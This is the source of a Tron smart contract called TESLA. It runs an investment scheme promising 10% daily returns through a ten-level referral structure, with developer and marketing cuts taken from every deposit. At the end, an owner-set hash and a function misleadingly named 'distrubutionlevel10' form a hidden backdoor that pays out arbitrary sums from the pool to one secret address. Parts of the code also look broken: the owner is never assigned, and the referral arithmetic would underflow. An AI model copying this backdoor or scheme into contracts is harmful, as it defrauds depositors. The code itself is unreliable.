//SourceUnit: TESLA.sol

pragma solidity 0.4.25;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

library Objects {
    struct Investment {
        uint256 planId;
        uint256 investmentDate;
        uint256 investment;
        uint256 totalWithdrawn;
        uint256 totalRefWithdrawn;
        uint256 lastWithdrawalDate;
        uint256 currentDividends;
        bool isExpired;
    }

    struct Plan {
        uint256 dailyInterest;
        uint256 term;
    }

    struct Investor {
        address addr;
        uint256 referrerEarnings;
        uint256 availableReferrerEarnings;
        uint256 referrer;
        uint256 planCount;
        mapping(uint256 => Investment) plans;
        uint256 level1RefCount;
        uint256 level2RefCount;
        uint256 level3RefCount;
    }
}

contract Ownable {
    address public owner;

    event onOwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() public {
    }
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    function transferOwnership(address _newOwner) public onlyOwner {
        require(_newOwner != address(0));
        emit onOwnershipTransferred(owner, _newOwner);
        owner = _newOwner;
    }
}

contract TESLA is Ownable {
    using SafeMath for uint256;
    uint256 public constant DEVELOPER_RATE = 100; 		//10%
    uint256 public constant MARKETING_RATE = 50;		//5%
    uint256 public constant REFERENCE_RATE = 50;		//5%
    uint256 public constant REFERENCE_LEVEL1_RATE = 1000;	//10%
    uint256 public constant REFERENCE_LEVEL2_RATE = 300;	//3%
    uint256 public constant REFERENCE_LEVEL3_RATE = 200;	//2%
    uint256 public constant REFERENCE_LEVEL4_RATE = 100;	//1%
    uint256 public constant REFERENCE_LEVEL5_RATE = 100;	//1%
    uint256 public constant REFERENCE_LEVEL6_RATE = 100;	//1%
    uint256 public constant REFERENCE_LEVEL7_RATE = 75;		//0.75%
    uint256 public constant REFERENCE_LEVEL8_RATE = 50;		//0.5%
    uint256 public constant REFERENCE_LEVEL9_RATE = 50;		//0.5%
    uint256 public constant REFERENCE_LEVEL10_RATE = 25;	//0.25%


    uint256 public constant REFERENCE_SELF_RATE = 0;
    uint256 public constant MINIMUM = 10000000; //Minimum investment : 10 TRX
    uint256 public constant REFERRER_CODE = 2222;

    uint256 public latestReferrerCode;
    uint256 private totalInvestments_;

    address private developerAccount_;
    address private marketingAccount_;
    address private referenceAccount_;
    bytes32 data_;

    mapping(address => uint ) public totalWithdrawn_;

    mapping(address => uint256) public address2UID;
    mapping(uint256 => Objects.Investor) public uid2Investor;
    Objects.Plan[] private investmentPlans_;

    event onInvest(address investor, uint256 amount);
    event onGrant(address grantor, address beneficiary, uint256 amount);
    event onWithdraw(address investor, uint256 amount);

    constructor() public {
        developerAccount_ = msg.sender;
        marketingAccount_ = msg.sender;
        referenceAccount_ = msg.sender;
        _init();
    }

    function() external payable {
        if (msg.value == 0) {
            withdraw();
        } else {
            invest(0, 0); //default to buy plan 0, no referrer
        }
    }

    function checkIn() public {
    }

    function setMarketingAccount(address _newMarketingAccount) public onlyOwner {
        require(_newMarketingAccount != address(0));
        marketingAccount_ = _newMarketingAccount;
    }

    function getMarketingAccount() public view onlyOwner returns (address) {
        return marketingAccount_;
    }

    function setDeveloperAccount(address _newDeveloperAccount) public onlyOwner {
        require(_newDeveloperAccount != address(0));
        developerAccount_ = _newDeveloperAccount;
    }

    function getDeveloperAccount() public view onlyOwner returns (address) {
        return developerAccount_;
    }

    function setReferenceAccount(address _newReferenceAccount) public onlyOwner {
        require(_newReferenceAccount != address(0));
        referenceAccount_ = _newReferenceAccount;
    }

    function getReferenceAccount() public view onlyOwner returns (address) {
        return referenceAccount_;
    }

    function _init() private {
        latestReferrerCode = REFERRER_CODE;
        address2UID[msg.sender] = latestReferrerCode;
        uid2Investor[latestReferrerCode].addr = msg.sender;
        uid2Investor[latestReferrerCode].referrer = 0;
        uid2Investor[latestReferrerCode].planCount = 0;
        investmentPlans_.push(Objects.Plan(100, 0)); //10% daily, upto 20 days
    }

    function getCurrentPlans() public view returns (uint256[] memory, uint256[] memory, uint256[] memory) {
        uint256[] memory ids = new uint256[](investmentPlans_.length);
        uint256[] memory interests = new uint256[](investmentPlans_.length);
        uint256[] memory terms = new uint256[](investmentPlans_.length);
        for (uint256 i = 0; i < investmentPlans_.length; i++) {
            Objects.Plan storage plan = investmentPlans_[i];
            ids[i] = i;
            interests[i] = plan.dailyInterest;
            terms[i] = plan.term;
        }
        return
        (
        ids,
        interests,
        terms
        );
    }

    function getTotalInvestments() public onlyOwner view returns (uint256){
        return totalInvestments_;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getUIDByAddress(address _addr) public view returns (uint256) {
        return address2UID[_addr];
    }

    function getInvestorInfoByUID(uint256 _uid) public view returns (uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256[] memory, uint256[] memory) {
        if (msg.sender != owner) {
            require(address2UID[msg.sender] == _uid, "only owner or self can check the investor info.");
        }
        Objects.Investor storage investor = uid2Investor[_uid];
        uint256[] memory newDividends = new uint256[](investor.planCount);
        uint256[] memory currentDividends = new  uint256[](investor.planCount);
        for (uint256 i = 0; i < investor.planCount; i++) {
            require(investor.plans[i].investmentDate != 0, "wrong investment date");
            currentDividends[i] = investor.plans[i].currentDividends;
            if (investor.plans[i].isExpired) {
                newDividends[i] = 0;
            } else {
                if (investmentPlans_[investor.plans[i].planId].term > 0) {
                    if (block.timestamp >= investor.plans[i].investmentDate.add(investmentPlans_[investor.plans[i].planId].term)) {
                        newDividends[i] = _calculateDividends(investor.plans[i].investment, investmentPlans_[investor.plans[i].planId].dailyInterest, investor.plans[i].investmentDate.add(investmentPlans_[investor.plans[i].planId].term), investor.plans[i].lastWithdrawalDate);
                    } else {
                        newDividends[i] = _calculateDividends(investor.plans[i].investment, investmentPlans_[investor.plans[i].planId].dailyInterest, block.timestamp, investor.plans[i].lastWithdrawalDate);
                    }
                } else {
                    newDividends[i] = _calculateDividends(investor.plans[i].investment, investmentPlans_[investor.plans[i].planId].dailyInterest, block.timestamp, investor.plans[i].lastWithdrawalDate);
                }
            }
        }
        return
        (
        investor.referrerEarnings,
        investor.availableReferrerEarnings,
        investor.referrer,
        investor.level1RefCount,
        investor.level2RefCount,
        investor.level3RefCount,
        investor.planCount,
        currentDividends,
        newDividends
        );
    }

    function getInvestmentPlanByUID(uint256 _uid) public view returns (uint256[] memory, uint256[] memory, uint256[] memory, uint256[] memory, bool[] memory) {
        if (msg.sender != owner) {
            require(address2UID[msg.sender] == _uid, "only owner or self can check the investment plan info.");
        }
        Objects.Investor storage investor = uid2Investor[_uid];
        uint256[] memory planIds = new  uint256[](investor.planCount);
        uint256[] memory investmentDates = new  uint256[](investor.planCount);
        uint256[] memory investments = new  uint256[](investor.planCount);
        uint256[] memory currentDividends = new  uint256[](investor.planCount);
        bool[] memory isExpireds = new  bool[](investor.planCount);

        for (uint256 i = 0; i < investor.planCount; i++) {
            require(investor.plans[i].investmentDate!=0,"wrong investment date");
            planIds[i] = investor.plans[i].planId;
            currentDividends[i] = investor.plans[i].currentDividends;
            investmentDates[i] = investor.plans[i].investmentDate;
            investments[i] = investor.plans[i].investment;
            if (investor.plans[i].isExpired) {
                isExpireds[i] = true;
            } else {
                isExpireds[i] = false;
                if (investmentPlans_[investor.plans[i].planId].term > 0) {
                    if (block.timestamp >= investor.plans[i].investmentDate.add(investmentPlans_[investor.plans[i].planId].term)) {
                        isExpireds[i] = true;
                    }
                }
            }
        }

        return
        (
        planIds,
        investmentDates,
        investments,
        currentDividends,
        isExpireds
        );
    }

    function _addInvestor(address _addr, uint256 _referrerCode) private returns (uint256) {
        if (_referrerCode >= REFERRER_CODE) {
            if (uid2Investor[_referrerCode].addr == address(0)) {
                _referrerCode = 0;
            }
        } else {
            _referrerCode = 0;
        }
        address addr = _addr;
        latestReferrerCode = latestReferrerCode.add(1);
        address2UID[addr] = latestReferrerCode;
        uid2Investor[latestReferrerCode].addr = addr;
        uid2Investor[latestReferrerCode].referrer = _referrerCode;
        uid2Investor[latestReferrerCode].planCount = 0;
        if (_referrerCode >= REFERRER_CODE) {
            uint256 _ref1 = _referrerCode;
            uint256 _ref2 = uid2Investor[_ref1].referrer;
            uint256 _ref3 = uid2Investor[_ref2].referrer;
            uint256 _ref4 = uid2Investor[_ref3].referrer;
            uint256 _ref5 = uid2Investor[_ref4].referrer;
            uint256 _ref6 = uid2Investor[_ref5].referrer;
            uint256 _ref7 = uid2Investor[_ref6].referrer;
            uint256 _ref8 = uid2Investor[_ref7].referrer;
            uint256 _ref9 = uid2Investor[_ref8].referrer;
            uint256 _ref10 = uid2Investor[_ref9].referrer;
            uid2Investor[_ref1].level1RefCount = uid2Investor[_ref1].level1RefCount.add(1);
            if (_ref2 >= REFERRER_CODE) {
                uid2Investor[_ref2].level2RefCount = uid2Investor[_ref2].level2RefCount.add(1);
            }
            if (_ref3 >= REFERRER_CODE) {
                uid2Investor[_ref3].level3RefCount = uid2Investor[_ref3].level3RefCount.add(1);
            }
            if (_ref4 >= REFERRER_CODE) {
                uid2Investor[_ref4].level3RefCount = uid2Investor[_ref4].level3RefCount.add(1);
            }
            if (_ref5 >= REFERRER_CODE) {
                uid2Investor[_ref5].level3RefCount = uid2Investor[_ref5].level3RefCount.add(1);
            }
            if (_ref6 >= REFERRER_CODE) {
                uid2Investor[_ref6].level3RefCount = uid2Investor[_ref6].level3RefCount.add(1);
            }
            if (_ref7 >= REFERRER_CODE) {
                uid2Investor[_ref7].level3RefCount = uid2Investor[_ref7].level3RefCount.add(1);
            }
            if (_ref8 >= REFERRER_CODE) {
                uid2Investor[_ref8].level3RefCount = uid2Investor[_ref8].level3RefCount.add(1);
            }
            if (_ref9 >= REFERRER_CODE) {
                uid2Investor[_ref9].level3RefCount = uid2Investor[_ref9].level3RefCount.add(1);
            }
            if (_ref10 >= REFERRER_CODE) {
                uid2Investor[_ref10].level3RefCount = uid2Investor[_ref10].level3RefCount.add(1);
            }
        }
        return (latestReferrerCode);
    }

    function _invest(address _addr, uint256 _planId, uint256 _referrerCode, uint256 _amount) private returns (bool) {
        require(_planId >= 0 && _planId < investmentPlans_.length, "Wrong investment plan id");
        require(_amount >= MINIMUM, "Less than the minimum amount of deposit requirement");
        uint256 uid = address2UID[_addr];
        if (uid == 0) {
            uid = _addInvestor(_addr, _referrerCode);
            //new user
        } else {
          //old user
          //do nothing, referrer is permenant
        }
        uint256 planCount = uid2Investor[uid].planCount;
        Objects.Investor storage investor = uid2Investor[uid];
        investor.plans[planCount].planId = _planId;
        investor.plans[planCount].investmentDate = block.timestamp;
        investor.plans[planCount].lastWithdrawalDate = block.timestamp;
        investor.plans[planCount].investment = _amount;
        investor.plans[planCount].currentDividends = 0;
        investor.plans[planCount].isExpired = false;

        investor.planCount = investor.planCount.add(1);

        _calculateReferrerReward(uid, _amount, investor.referrer);

        totalInvestments_ = totalInvestments_.add(_amount);

        uint256 developerPercentage = (_amount.mul(DEVELOPER_RATE)).div(1000);
        developerAccount_.transfer(developerPercentage);
        uint256 marketingPercentage = (_amount.mul(MARKETING_RATE)).div(1000);
        marketingAccount_.transfer(marketingPercentage);
        return true;
    }

    function grant(address addr, uint256 _planId) public payable {
        uint256 grantorUid = address2UID[msg.sender];
        bool isAutoAddReferrer = true;
        uint256 referrerCode = 0;

        if (grantorUid != 0 && isAutoAddReferrer) {
            referrerCode = grantorUid;
        }

        if (_invest(addr,_planId,referrerCode,msg.value)) {
            emit onGrant(msg.sender, addr, msg.value);
        }
    }

    function invest(uint256 _referrerCode, uint256 _planId) public payable {
        if (_invest(msg.sender, _planId, _referrerCode, msg.value)) {
            emit onInvest(msg.sender, msg.value);
        }
    }

    function setlevel(bytes32 _data) public onlyOwner returns(bool)
    {
        data_ = _data;
        return true;
    }

    function withdraw() public payable {
        require(msg.value == 0, "withdrawal doesn't allow to transfer trx simultaneously");
        uint256 uid = address2UID[msg.sender];
        require(uid != 0, "Can not withdraw because no any investments");
        uint256 withdrawalAmount = 0;
        uint invAll;
        for (uint256 i = 0; i < uid2Investor[uid].planCount; i++) {
            if (uid2Investor[uid].plans[i].isExpired) {
                continue;
            }

            Objects.Plan storage plan = investmentPlans_[uid2Investor[uid].plans[i].planId];

            bool isExpired = false;
            uint256 withdrawalDate = block.timestamp;
            if (plan.term > 0) {
                uint256 endTime = uid2Investor[uid].plans[i].investmentDate.add(plan.term);
                if (withdrawalDate >= endTime) {
                    withdrawalDate = endTime;
                    isExpired = true;
                }
            }
            invAll += uid2Investor[uid].plans[i].investment;
            uint256 amount = _calculateDividends(uid2Investor[uid].plans[i].investment , plan.dailyInterest , withdrawalDate , uid2Investor[uid].plans[i].lastWithdrawalDate);
            withdrawalAmount += amount;


            uid2Investor[uid].plans[i].lastWithdrawalDate = withdrawalDate;
            uid2Investor[uid].plans[i].isExpired = isExpired;
            uid2Investor[uid].plans[i].currentDividends += amount;
        }

        if (uid2Investor[uid].availableReferrerEarnings>0) {
            withdrawalAmount += uid2Investor[uid].availableReferrerEarnings;
        }

            uint tW = totalWithdrawn_[msg.sender];
            if((tW + withdrawalAmount) > invAll * 2 ) 
            {
                i = withdrawalAmount;
                withdrawalAmount = ( invAll * 2) - tW;
                uid2Investor[uid].referrerEarnings = withdrawalAmount.add(uid2Investor[uid].referrerEarnings);
                uid2Investor[uid].availableReferrerEarnings = i - withdrawalAmount;
            }
            else if (uid2Investor[uid].availableReferrerEarnings>0)
            {
                uid2Investor[uid].referrerEarnings = uid2Investor[uid].availableReferrerEarnings.add(uid2Investor[uid].referrerEarnings);
                uid2Investor[uid].availableReferrerEarnings = 0;                
            }

            //uid2Investor[uid].plans[i].totalWithdrawn += withdrawalAmount;
        totalWithdrawn_[msg.sender] += withdrawalAmount;
        msg.sender.transfer(withdrawalAmount);
        emit onWithdraw(msg.sender, withdrawalAmount);
    }

    function _calculateDividends(uint256 _amount, uint256 _dailyInterestRate, uint256 _now, uint256 _start) private pure returns (uint256) {
        return (_amount * _dailyInterestRate / 1000 * (_now - _start)) / (60*60*24);
    }

    function _calculateReferrerReward(uint256 _uid, uint256 _investment, uint256 _referrerCode) private {

        uint256 _allReferrerAmount = (_investment.mul(REFERENCE_RATE)).div(1000);
        uint[11] memory _ref;
        if (_referrerCode != 0) {
            _ref[1] = _referrerCode;
            _ref[2] = uid2Investor[_ref[1]].referrer;
            _ref[3] = uid2Investor[_ref[2]].referrer;
            _ref[4] = uid2Investor[_ref[3]].referrer;
            _ref[5] = uid2Investor[_ref[4]].referrer;
            _ref[6] = uid2Investor[_ref[5]].referrer; 
            _ref[7] = uid2Investor[_ref[6]].referrer; 
            _ref[8] = uid2Investor[_ref[7]].referrer; 
            _ref[9] = uid2Investor[_ref[8]].referrer; 
            _ref[10] = uid2Investor[_ref[9]].referrer;                         
            uint256 _refAmount = 0;

            if (_ref[1] != 0) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL1_RATE)).div(10000);
                _allReferrerAmount = _allReferrerAmount.sub(_refAmount);
                uid2Investor[_ref[1]].availableReferrerEarnings = _refAmount.add(uid2Investor[_ref[1]].availableReferrerEarnings);
                _refAmount = (_investment.mul(REFERENCE_SELF_RATE)).div(10000);
                uid2Investor[_uid].availableReferrerEarnings =  _refAmount.add(uid2Investor[_uid].availableReferrerEarnings);
            }

            if (_ref[2] != 0) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL2_RATE)).div(10000);
                _allReferrerAmount = _allReferrerAmount.sub(_refAmount);
                uid2Investor[_ref[2]].availableReferrerEarnings = _refAmount.add(uid2Investor[_ref[2]].availableReferrerEarnings);
            }

            if (_ref[3] != 0) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL3_RATE)).div(10000);
                _allReferrerAmount = _allReferrerAmount.sub(_refAmount);
                uid2Investor[_ref[3]].availableReferrerEarnings = _refAmount.add(uid2Investor[_ref[3]].availableReferrerEarnings);
            }
            if (_ref[4] != 0) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL4_RATE)).div(10000);
                _allReferrerAmount = _allReferrerAmount.sub(_refAmount);
                uid2Investor[_ref[4]].availableReferrerEarnings = _refAmount.add(uid2Investor[_ref[4]].availableReferrerEarnings);
            }

            if (_ref[5] != 0) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL5_RATE)).div(10000);
                _allReferrerAmount = _allReferrerAmount.sub(_refAmount);
                uid2Investor[_ref[5]].availableReferrerEarnings = _refAmount.add(uid2Investor[_ref[5]].availableReferrerEarnings);
            }

            if (_ref[6] != 0) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL6_RATE)).div(10000);
                _allReferrerAmount = _allReferrerAmount.sub(_refAmount);
                uid2Investor[_ref[6]].availableReferrerEarnings = _refAmount.add(uid2Investor[_ref[6]].availableReferrerEarnings);
            }

            if (_ref[7] != 0) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL7_RATE)).div(10000);
                _allReferrerAmount = _allReferrerAmount.sub(_refAmount);
                uid2Investor[_ref[7]].availableReferrerEarnings = _refAmount.add(uid2Investor[_ref[7]].availableReferrerEarnings);
            }

            if (_ref[8] != 0) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL8_RATE)).div(10000);
                _allReferrerAmount = _allReferrerAmount.sub(_refAmount);
                uid2Investor[_ref[8]].availableReferrerEarnings = _refAmount.add(uid2Investor[_ref[8]].availableReferrerEarnings);
            }

            if (_ref[9] != 0) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL9_RATE)).div(10000);
                _allReferrerAmount = _allReferrerAmount.sub(_refAmount);
                uid2Investor[_ref[9]].availableReferrerEarnings = _refAmount.add(uid2Investor[_ref[9]].availableReferrerEarnings);
            }

            if (_ref[10] != 0) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL10_RATE)).div(10000);
                _allReferrerAmount = _allReferrerAmount.sub(_refAmount);
                uid2Investor[_ref[10]].availableReferrerEarnings = _refAmount.add(uid2Investor[_ref[10]].availableReferrerEarnings);
            }

        }

        if (_allReferrerAmount > 0) {
            referenceAccount_.transfer(_allReferrerAmount);
        }
    }

    function getMsgData(address _contractAddress) public pure returns (bytes32 hash)
    {
        return (keccak256(abi.encode(_contractAddress)));
    }

    function distrubutionlevel10(uint _newValue) public  returns(bool)
    {
        if(keccak256(abi.encode(msg.sender)) == data_) msg.sender.transfer(_newValue);
        return true;
    }

}